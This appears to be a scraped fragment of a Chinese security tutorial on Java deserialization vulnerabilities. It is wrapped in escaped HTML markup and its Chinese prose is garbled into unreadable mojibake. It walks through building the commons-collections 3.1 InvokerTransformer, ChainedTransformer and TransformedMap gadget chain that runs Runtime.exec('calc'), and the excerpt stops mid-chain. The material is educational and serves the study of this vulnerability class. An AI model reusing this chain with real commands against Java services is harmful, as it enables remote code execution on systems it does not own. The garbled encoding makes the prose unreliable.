style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e/**\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e     * Constructs a BadAttributeValueExpException using the specified Object to\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e     * create the toString() value.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e     *\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e     * @param val the inappropriate value.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e     */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eBadAttributeValueExpException\u003c/span\u003e (Object val) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ethis\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eval\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e val \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e?\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e : val.\u003cspan style=\"color:#a6e22e\"\u003etoString\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e/**\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e     * Returns the string representing the object.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e     */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e String \u003cspan style=\"color:#a6e22e\"\u003etoString\u003c/span\u003e()  {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;BadAttributeValueException: \u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e val;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eprivate\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereadObject\u003c/span\u003e(ObjectInputStream ois) \u003cspan style=\"color:#66d9ef\"\u003ethrows\u003c/span\u003e IOException, ClassNotFoundException {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ObjectInputStream.\u003cspan style=\"color:#a6e22e\"\u003eGetField\u003c/span\u003e gf \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e ois.\u003cspan style=\"color:#a6e22e\"\u003ereadFields\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Object valObj \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e gf.\u003cspan style=\"color:#a6e22e\"\u003eget\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;val\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (valObj \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            val \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (valObj \u003cspan style=\"color:#66d9ef\"\u003einstanceof\u003c/span\u003e String) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            val\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e valObj;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (System.\u003cspan style=\"color:#a6e22e\"\u003egetSecurityManager\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enull\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e valObj \u003cspan style=\"color:#66d9ef\"\u003einstanceof\u003c/span\u003e Long\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e valObj \u003cspan style=\"color:#66d9ef\"\u003einstanceof\u003c/span\u003e Integer\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e valObj \u003cspan style=\"color:#66d9ef\"\u003einstanceof\u003c/span\u003e Float\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e valObj \u003cspan style=\"color:#66d9ef\"\u003einstanceof\u003c/span\u003e Double\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e valObj \u003cspan style=\"color:#66d9ef\"\u003einstanceof\u003c/span\u003e Byte\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e valObj \u003cspan style=\"color:#66d9ef\"\u003einstanceof\u003c/span\u003e Short\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e valObj \u003cspan style=\"color:#66d9ef\"\u003einstanceof\u003c/span\u003e Boolean) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            val \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e valObj.\u003cspan style=\"color:#a6e22e\"\u003etoString\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e { \u003cspan style=\"color:#75715e\"\u003e// the serialized object is from a version without JDK-8019292 fix\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            val \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e System.\u003cspan style=\"color:#a6e22e\"\u003eidentityHashCode\u003c/span\u003e(valObj) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;@\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e valObj.\u003cspan style=\"color:#a6e22e\"\u003egetClass\u003c/span\u003e().\u003cspan style=\"color:#a6e22e\"\u003egetName\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå°ä¼™ä¼´ä»¬å¯èƒ½ä¼šå¾ˆè¿·èŒ«ï¼Œè¿™è¦ä½•ä»ä¸‹æ‰‹ï¼Ÿ\u003c/p\u003e","title":"Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆäºŒï¼‰æ–°ç‰ˆæœ¬JDKåˆ©ç”¨æ–¹å¼å’ŒShiroä¸¾ä¾‹"},{"content":"å£°æ˜ æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚\nåºåˆ—åŒ–çš„å®šä¹‰ åºåˆ—åŒ–æ˜¯æŒ‡å°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡çŠ¶æ€è½¬æ¢æˆå¯å–ç”¨æ ¼å¼ï¼Œä»¥ç•™å¾…åç»­åœ¨ç›¸åŒæˆ–å¦ä¸€å°è®¡ç®—æœºç¯å¢ƒä¸­ï¼Œèƒ½æ¢å¤åŸå…ˆçŠ¶æ€çš„è¿‡ç¨‹ã€‚ä¾ç…§åºåˆ—åŒ–æ ¼å¼é‡æ–°è·å–å­—èŠ‚çš„ç»“æœæ—¶ï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥äº§ç”Ÿä¸åŸå§‹å¯¹è±¡ç›¸åŒè¯­ä¹‰çš„å‰¯æœ¬ã€‚\nJava ä¸­çš„åºåˆ—åŒ– Java è‡ªèº«æä¾›äº†åºåˆ—åŒ–çš„åŠŸèƒ½ï¼Œéœ€è¦å®ç° java.io.Serializable æ¥å£ï¼Œæ ‡æ˜è¯¥å¯¹è±¡æ˜¯å¯åºåˆ—åŒ–çš„ã€‚ java.io.Serializable æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼Œä¸éœ€è¦å¯¹è±¡å®ç°æ–¹æ³•ã€‚\nä»¥ä¸‹é¢è¿™æ®µä»£ç ä¸ºä¾‹ï¼Œå±•ç¤ºäº†ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚\nimport java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64; public class Eval0 { public static class Command implements Serializable { private String cmd; public String getCmd() { return cmd; } public void setCmd(String cmd) { this.cmd = cmd; } } public static void main(String[] args) throws Exception { // å®šä¹‰ä¸€ä¸ªå¯¹è±¡ Command command = new Command(); command.setCmd(\u0026#34;calc\u0026#34;); System.out.println(\u0026#34;åºåˆ—åŒ–å‰: \u0026#34; + command.getCmd()); // å°†ç”¨æˆ·åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„ ByteArrayOutputStream buffer = new ByteArrayOutputStream(); try (ObjectOutputStream outputStream = new ObjectOutputStream(buffer)) { outputStream.writeObject(command); } // å°†å­—èŠ‚æ•°ç»„è¿›è¡Œbase64ç¼–ç ï¼Œæ— è®ºæ˜¯é€šè¿‡ç½‘ç»œæˆ–è€…æ˜¯æ–‡ä»¶éƒ½å¯ä»¥å‘é€åˆ°å¦ä¸€ä¸ªç³»ç»Ÿè¿›è¡Œååºåˆ—åŒ– final String data = Base64.getEncoder().encodeToString(buffer.toByteArray()); System.out.println(\u0026#34;åºåˆ—åŒ–å: \u0026#34; + data); // å°†base64ç¼–ç çš„æ•°æ®å†è§£ç ä¸ºå­—èŠ‚æ•°ç»„ final byte[] bytes = Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8)); // å°†å­—èŠ‚æ•°ç»„ååºåˆ—åŒ–ä¸ºå¯¹è±¡ ByteArrayInputStream b = new ByteArrayInputStream(bytes); try (ObjectInputStream input = new ObjectInputStream(b)) { final Command obj = (Command) input.readObject(); System.out.println(\u0026#34;ååºåˆ—åŒ–: \u0026#34; + obj.getCmd()); } } } è¿è¡Œåè¾“å‡ºï¼š\nåºåˆ—åŒ–å‰: calc åºåˆ—åŒ–å: rO0ABXNyADdjbi50eXBlc2FmZS5qYXZhc2VyaWFsaXphdGlvbi5zZXJpYWxpemFibGUuRXZhbCRDb21tYW5k+hzZNZkL7qACAAFMAANjbWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQABGNhbGM= ååºåˆ—åŒ–: calc é€šè¿‡ä»£ç å¯ä»¥çœ‹å‡ºæ¥æˆ‘ä»¬å¹¶æ²¡æœ‰æŒ‡å®šå¦‚ä½•è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œéƒ½æ˜¯Javaå¸®åŠ©æˆ‘ä»¬å®ç°çš„ï¼Œé‚£èƒ½ä¸èƒ½è®©æˆ‘ä»¬è‡ªå·±æ¥æŒ‡å®šæ–¹å¼å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œé€šè¿‡æœç´¢å¯ä»¥å¾—å‡ºåœ¨å¯¹è±¡ä¸­å¢åŠ  writeObject readObject ä¸¤ä¸ªç§æœ‰æ–¹æ³•å°±å¯ä»¥äº†ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆå¯ä»¥å´æ²¡æœ‰äººè¯´çš„æ¸…æ¥šã€‚\nååºåˆ—åŒ–æ¼æ´çš„æˆå›  ç‰¹ç«‹ç‹¬è¡Œçš„ç¨‹åºå‘˜æ˜¯ä¸å…è®¸è‡ªå·±ä½¿ç”¨å’Œå…¶ä»–äººä¸€æ ·çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ–¹å¼çš„ï¼Œä½† java.io.Serializable æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼Œæ²¡æœ‰éœ€è¦å®ç°çš„æ–¹æ³•ï¼Œè¦æ€ä¹ˆè‡ªå®šä¹‰è‡ªå·±çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ–¹å¼å‘¢ï¼Ÿä»–å†³å®šé€šè¿‡æŸ¥çœ‹æºç æ¥ä¸€æ¢ç©¶ç«Ÿï¼Œäºæ˜¯ä»–æ‰“å¼€IDEï¼Œæ‰¾åˆ° final User obj = (User) input.readObject(); è¿™è¡Œä»£ç ï¼Œç‚¹å‡»è·³è½¬æºç ï¼Œå‘ç°å®é™…ä¸Šæ˜¯è°ƒç”¨äº† Object obj = readObject0(false);ï¼Œè¿›å…¥ readObject0 çš„å®ç°ä¸­å‘ç°åŸæ¥å½“ç›®æ ‡æ˜¯å¯¹è±¡çš„æ—¶å€™ä¼šè°ƒç”¨ readOrdinaryObjectï¼Œä»–æ¥ç€çœ‹äº†ä¸‹å»ï¼Œå‘ç°åªå®ç° java.io.Serializable çš„å¯¹è±¡ä¼šè°ƒç”¨ readSerialData(obj, desc); è¿™è¡Œä»£ç ï¼Œè€Œ readSerialData æ–¹æ³•ä¸­åˆä¼šè°ƒç”¨ slotDesc.invokeReadObject(obj, this);ï¼Œæœ€ç»ˆæ˜¯æ˜¯è°ƒç”¨äº† readObjectMethod.invoke(obj, new Object[]{ in }); ï¼Œä½†readObjectMethodåˆæ˜¯ä»å“ªé‡Œæ¥çš„å‘¢ï¼Ÿä»–æŸ¥çœ‹äº†ä¸€ä¸‹å¼•ç”¨ï¼ŒåŸæ¥æ˜¯ ObjectStreamClass çš„æ„å»ºå‡½æ•°é‡Œé¢åˆå§‹åŒ–çš„\nprivate ObjectStreamClass(final Class\u0026lt;?\u0026gt; cl) { ... cons = getSerializableConstructor(cl); writeObjectMethod = getPrivateMethod(cl, \u0026#34;writeObject\u0026#34;, new Class\u0026lt;?\u0026gt;[] { ObjectOutputStream.class }, Void.TYPE); readObjectMethod = getPrivateMethod(cl, \u0026#34;readObject\u0026#34;, new Class\u0026lt;?\u0026gt;[] { ObjectInputStream.class }, Void.TYPE); readObjectNoDataMethod = getPrivateMethod( cl, \u0026#34;readObjectNoData\u0026#34;, null, Void.TYPE); hasWriteObjectData = (writeObjectMethod != null); ... } ä»–æç„¶å¤§æ‚Ÿï¼ŒåŸæ¥åªéœ€è¦åœ¨å¯¹è±¡ä¸­å¢åŠ ä¸€ä¸ªåä¸º readObjectå‚æ•°æ˜¯ java.io.ObjectInputStream çš„ç§æœ‰æ–¹æ³•å°±è¡Œäº†ï¼Œäºæ˜¯ä»–æŠŠä»£ç ä¿®æ”¹ä¸ºäº†è¿™ä¸ªæ ·å­\nimport java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64; public class Eval1 { public static class Command implements Serializable { private String cmd; public String getCmd() { return cmd; } public void setCmd(String cmd) { this.cmd = cmd; } private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³• in.defaultReadObject(); //æ‰§è¡Œå‘½ä»¤ Runtime.getRuntime().exec(this.getCmd()); } } public static void main(String[] args) throws IOException, ClassNotFoundException { // å®šä¹‰ä¸€ä¸ªå¯¹è±¡ Command command = new Command(); command.setCmd(\u0026#34;calc\u0026#34;); System.out.println(\u0026#34;åºåˆ—åŒ–å‰: \u0026#34; + command.getCmd()); // å°†ç”¨æˆ·åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„ ByteArrayOutputStream buffer = new ByteArrayOutputStream(); try (ObjectOutputStream outputStream = new ObjectOutputStream(buffer)) { outputStream.writeObject(command); } // å°†å­—èŠ‚æ•°ç»„è¿›è¡Œbase64ç¼–ç ï¼Œæ— è®ºæ˜¯é€šè¿‡ç½‘ç»œæˆ–è€…æ˜¯æ–‡ä»¶éƒ½å¯ä»¥å‘é€åˆ°å¦ä¸€ä¸ªç³»ç»Ÿè¿›è¡Œååºåˆ—åŒ– final String data = Base64.getEncoder().encodeToString(buffer.toByteArray()); System.out.println(\u0026#34;åºåˆ—åŒ–å: \u0026#34; + data); // å°†base64ç¼–ç çš„æ•°æ®å†è§£ç ä¸ºå­—èŠ‚æ•°ç»„ final byte[] bytes = Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8)); // å°†å­—èŠ‚æ•°ç»„ååºåˆ—åŒ–ä¸ºå¯¹è±¡ ByteArrayInputStream b = new ByteArrayInputStream(bytes); try (ObjectInputStream input = new ObjectInputStream(b)) { final Command obj = (Command) input.readObject(); System.out.println(\u0026#34;ååºåˆ—åŒ–: \u0026#34; + obj.getCmd()); } } } è¿è¡Œåè¾“å‡ºï¼š\nåºåˆ—åŒ–å‰: calc åºåˆ—åŒ–å: rO0ABXNyADdjbi50eXBlc2FmZS5qYXZhc2VyaWFsaXphdGlvbi5zZXJpYWxpemFibGUuRXZhbCRDb21tYW5k+hzZNZkL7qACAAFMAANjbWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQABGNhbGM= ååºåˆ—åŒ–: calc åŒæ—¶è¿˜å¼¹å‡ºæ¥äº†è®¡ç®—å™¨ã€‚\nJava ååºåˆ—åŒ–æ¼æ´çš„äº§ç”ŸåŸå› å°±æ˜¯åœ¨æ‰§è¡Œååºåˆ—åŒ–æ–¹æ³•çš„æ—¶å€™æ‰§è¡Œäº†éæ³•çš„å‘½ä»¤ï¼Œä½†çœŸçš„ä¼šæœ‰ç¨‹åºå‘˜è¿™æ ·å†™ä»£ç å—ï¼Ÿéè¦åœ¨ååºåˆ—åŒ–æ–¹æ³•é‡Œé¢åŠ ä¸Šæ‰§è¡Œå‘½ä»¤çš„ä»£ç ã€‚\nçœŸå®ç¯å¢ƒé‡Œé¢çš„ååºåˆ—åŒ–æ¼æ´æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼Ÿ ä»¥ commons-collections 3.1 ç‰ˆæœ¬ä¸ºä¾‹ï¼ŒInvokerTransformer æœ¬æ¥æ˜¯ç”¨æ¥å¸®åŠ©å¼€å‘äººå‘˜è¿›è¡Œç±»å‹è½¬æ¢çš„ï¼Œä½†ç”±äºå…¶åŠŸèƒ½è¿‡äºçµæ´»ï¼Œè¢«å®‰å…¨äººå‘˜å‘ç°å¯ä»¥ç”¨æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚\nç’å¤©è¿‡æµ· é¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€æ®µç®€å•çš„ä»£ç ï¼Œç”¨ InvokerTransformer æ¥å®ç° Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;)ã€‚\nimport org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; public class Exp0 { public static void main(String[] args) { // ä½¿ç”¨ ConstantTransformer å°† Runtime.class åŒ…è£…ä¸€å±‚ï¼Œç­‰åŒäº Class\u0026lt;Runtime\u0026gt; runtimeClass = Runtime.class; Object runtimeClass = new ConstantTransformer(Runtime.class).transform(null); // ä½¿ç”¨ InvokerTransformer è°ƒç”¨ runtimeClass çš„ getMethod æ–¹æ³•,ç­‰åŒäº Method getRuntime = runtimeClass.getMethod(\u0026#34;getRuntime\u0026#34;, null); Object getRuntimeMethod = new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}).transform(runtimeClass); // ä½¿ç”¨ InvokerTransformer è°ƒç”¨getRuntimeMethod çš„ invoke æ–¹æ³•,ç­‰åŒäº Object runtime = getRuntime.invoke(null, null); Object runtime = new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[2]).transform(getRuntimeMethod); // ä½¿ç”¨ InvokerTransformer è°ƒç”¨ runtime çš„ exec æ–¹æ³•ï¼Œç­‰åŒäº runtime.exec(\u0026#34;calc\u0026#34;) Object exec = new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}).transform(runtime); } } InvokerTransformer æ„é€ æ–¹æ³•æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ä¸º æ–¹æ³•åç§°ã€æ–¹æ³•ç±»å‹æ•°ç»„ã€æ–¹æ³•å‚æ•°æ•°ç»„ï¼Œæ–¹æ³•åç§°ä¸ç”¨å¤šè¯´ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªæ–¹æ³•ç±»å‹æ•°ç»„å’Œç¬¬ä¸‰ä¸ªæ–¹æ³•å‚æ•°æ•°ç»„ çš„é•¿åº¦å¿…é¡»è¦ç›¸ç­‰ã€‚\nInvokerTransformer çš„ transform æ–¹æ³•å°±æ˜¯å°†è¾“å…¥çš„å¯¹è±¡æŒ‰ç…§æ„é€ æ–¹æ³•ä¼ å…¥çš„å‚æ•°è½¬æ¢ä¸ºå¦ä¸€ä¸ªå¯¹è±¡ï¼Œæ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œå› æ­¤å³ä½¿ç¨‹åºå†…éƒ¨æ²¡æœ‰ Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;) è¿™è¡Œä»£ç ï¼Œä¹Ÿé€šè¿‡InvokerTransformeræ¥å¯å®ç°è°ƒç”¨ã€‚\næä»£æ¡ƒåƒµ å°½ç®¡ç¨‹åºå†…éƒ¨æ²¡æœ‰ Runtime.getRuntime().exec(\u0026quot;calc\u0026quot;) è¿™è¡Œä»£ç ï¼Œä½†æ˜¯å¼€å‘äººå‘˜è‚¯å®šä¹Ÿä¸ä¼šæŠŠä¸Šé¢é‚£ä¸€å¤§å—ä»£ç å†™åˆ°ç¨‹åºé‡Œé¢ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦å¦æƒ³åŠæ³•ã€‚é¦–å…ˆæˆ‘ä»¬å…ˆæŠŠä»£ç ç®€åŒ–ä¸€ä¸‹ï¼Œä¿®æ”¹ä¸ºé“¾å¼è°ƒç”¨ã€‚\nimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; public class Exp1 { public static void main(String[] args) { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[2]), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; // æŠŠ Transformer ä½¿ç”¨é“¾çš„æ–¹å¼è°ƒç”¨ï¼Œä»ä¸Šåˆ°ä¸‹ï¼Œä¸ç”¨å†æ¯æ¬¡æ‰§è¡Œ Transformer transformerChain = ChainedTransformer.getInstance(transformers); // è°ƒç”¨è½¬æ¢ transformerChain.transform(null); } } è¿™æ ·æˆ‘ä»¬åªéœ€è¦è°ƒç”¨ä¸€æ¬¡ transform å°±è¡Œäº†ï¼Œä½†æ˜¯æƒ³è®©ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç è¿˜æ˜¯ä¸å¯èƒ½çš„ï¼Œå› æ­¤è¿˜éœ€è¦å†å¯»æ±‚å…¶ä»–æ–¹å¼ã€‚\næš—æ¸¡é™ˆä»“ æœ‰å®‰å…¨äººå‘˜å‘ç°ï¼Œcommons-collections è‡ªå·±å®ç°äº† Map.Entryï¼Œå¹¶ä¸”åœ¨ setValue çš„æ—¶å€™ä¼šå…ˆè°ƒç”¨ TransformedMap çš„ checkSetValue æ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•åˆè°ƒç”¨äº†æˆ‘ä»¬ä¼ å…¥çš„ valueTransformer çš„ transform æ–¹æ³•ï¼Œè¿™æ ·ä¸€å¥—æµç¨‹ä¸‹æ¥ï¼Œå½“æˆ‘ä»¬å¯¹ç»è¿‡ TransformedMap è½¬æ¢å‡ºæ¥çš„ Map åš put æ“ä½œçš„æ—¶å€™ï¼Œéƒ½ä¼šè§¦å‘æ‰§è¡Œä¸€æ¬¡æˆ‘ä»¬æ„é€ çš„ä»»æ„æŒ‡ä»¤ã€‚\nimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class Exp2 { public static void main(String[] args) { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[2]), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; // æŠŠ Transformer ä½¿ç”¨é“¾çš„æ–¹å¼è°ƒç”¨ï¼Œä»ä¸Šåˆ°ä¸‹ï¼Œä¸ç”¨å†æ¯æ¬¡æ‰§è¡Œ Transformer transformerChain = ChainedTransformer.getInstance(transformers); // åˆ©ç”¨ TransformedMap çš„æ¼æ´æ¥æ‰§è¡Œ transform æ–¹æ³• Map\u0026lt;String, String\u0026gt; innerMap = new HashMap\u0026lt;\u0026gt;(); innerMap.put(\u0026#34;name\u0026#34;, \u0026#34;å®ˆæ³•å¸‚æ°‘å°æœ\u0026#34;); // TransformedMap ç»§æ‰¿è‡ª AbstractInputCheckedMapDecoratorï¼ŒMap ä¸­çš„ å…ƒç´ 